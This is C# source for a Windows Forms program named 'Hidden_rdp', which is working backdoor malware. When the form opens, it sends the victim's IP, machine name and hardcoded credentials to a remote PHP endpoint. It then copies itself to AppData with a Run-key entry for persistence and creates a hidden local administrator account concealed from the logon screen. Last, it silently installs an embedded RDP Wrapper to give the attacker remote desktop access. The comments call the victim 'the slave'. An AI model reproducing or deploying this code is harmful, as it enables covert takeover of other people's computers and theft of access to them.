using System;
using System.Windows.Forms;
using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Management;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Hidden_rdp
{
    public partial class Form1 : Form

    {
        //===========================================================================================================================================
        //Send data on open
        string targetUrl = "https://leakkings.000webhostapp.com/write.php?info=";
        string userName = "hidden";
        string pcName = Environment.MachineName.ToString();
        string myIp = new WebClient().DownloadString(@"http://ipv4bot.whatismyipaddress.com/");
        string password = "alimadore";


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            string info = myIp + ";" + pcName + ";" + userName + ";" + password;
            var fullurl = targetUrl + info;
            var conent = new System.Net.WebClient().DownloadString(fullurl);

            //===========================================================================================================================================
            //Copy to AppData + Registry Startup (incase pc has dynamic ip,add datasender to startup to prevent losing the slave
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SenderData.exe"))
            {
                this.Hide();
            }
            else
            {
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SenderData.exe");
                RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                reg.SetValue("Data", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SenderData.exe");
            }
            //===========================================================================================================================================
            //Create new user and make it admin (x64 bit only,need to make an "if-else" to check if its 32 bit or 64bit

            const string USER_NAME = "hidden";
            char[] c_PWchars = { 'A', 'l', 'i', 'm', 'a', 'd', 'o', 'r', 'e' };
            System.Security.SecureString oPW = new System.Security.SecureString();
            foreach (char c_Chr in c_PWchars)
            {
                oPW.AppendChar(c_Chr);
            }
            DirectoryEntry oComputer = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
            DirectoryEntry oNewUser = oComputer.Children.Add(USER_NAME, "user");
            IntPtr pString = IntPtr.Zero;
            pString = Marshal.SecureStringToGlobalAllocUnicode(oPW);
            oNewUser.Invoke("SetPassword", new object[] { Marshal.PtrToStringUni(pString) });
            oNewUser.Invoke("Put", new object[] { "Description", "New Administrator" });
            oNewUser.CommitChanges();
            Marshal.ZeroFreeGlobalAllocUnicode(pString);
            DirectoryEntry oGroup = oComputer.Children.Find("Administrators", "group");
            oGroup.Invoke("Add", new object[] { oNewUser.Path.ToString() });
            Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList");
            RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
            key.SetValue("UserNew", 0, RegistryValueKind.DWord);
            key.Close();

            //==========================================================================================================================================
            //Core part = Install the RDP Wrapper library (have it as an embedded resource)
            string path = Path.Combine(Path.GetTempPath(), "rdpwrap.exe");
            string arg = "-i";
            File.WriteAllBytes(path, Hidden_rdp.Properties.Resources.RDPWInst);
            Process.Start(path,arg);
            this.Close();

        }
    }
}



